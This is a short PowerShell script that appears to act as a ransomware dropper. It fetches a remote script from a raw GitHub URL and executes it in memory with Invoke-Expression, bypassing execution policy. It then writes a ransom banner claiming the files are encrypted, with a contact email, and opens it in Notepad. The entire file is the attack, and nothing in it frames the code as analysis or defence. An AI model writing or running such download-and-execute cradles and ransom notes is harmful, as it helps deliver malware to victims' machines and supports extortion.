# Define the remote PowerShell script URL
$uri = 'https://raw.githubusercontent.com/RamkrishnaSawant/Testing/refs/heads/main/RM4_cod.ps1'

# Define PowerShell arguments for execution
$argArray = @(
    '-ExecutionPolicy', 'Bypass',
    '-NoProfile',
    '-Command', "iex (Invoke-WebRequest -UseBasicParsing -Uri '$uri').Content"
)

# Run the remote script and wait for completion
Start-Process -FilePath 'powershell.exe' -ArgumentList $argArray -Wait

# Stylized message banner (looks centered/bold-ish in Notepad)
$message = @"
=========================================================================================
                                          WARNING!
=========================================================================================

             YOUR FILES HAVE BEEN ENCRYPED! TO REGAIN ACCESS, CONTACT XYZ@protonmail.com
=========================================================================================
"@

# Create a temporary file and write the message to it
$tempFile = [System.IO.Path]::GetTempFileName()
Set-Content -Path $tempFile -Value $message -Encoding UTF8

# Open Notepad to display the message
Start-Process -FilePath 'notepad.exe' -ArgumentList $tempFile
